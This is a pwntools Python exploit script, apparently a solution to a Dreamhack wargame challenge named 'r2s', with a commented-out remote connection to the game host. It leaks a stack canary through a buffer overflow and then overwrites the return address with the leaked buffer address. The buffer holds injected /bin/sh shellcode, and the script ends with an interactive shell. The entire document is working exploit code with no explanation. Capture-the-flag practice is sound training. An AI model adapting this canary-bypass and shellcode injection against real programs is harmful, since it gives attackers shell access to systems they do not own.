from pwn import *
p = process('./r2s')
#p = remote('host2.dreamhack.games',24098)

context.arch = 'amd64'

p.recvuntil('Address of the buf: ')
ret = int(p.recv(14),16)
#print(hex(ret))

payload = asm(shellcraft.sh())
payload = payload.ljust(89,b'\x90')
p.sendafter('Input: ',payload)
p.recvuntil(payload)
canary = b'\x00'+p.recv(7)

payload = payload[:-1]
payload += canary
payload += b'A'*8
payload += p64(ret)

#print(payload)
#print(len(payload))

p.recv()
p.sendline(payload)
p.interactive()
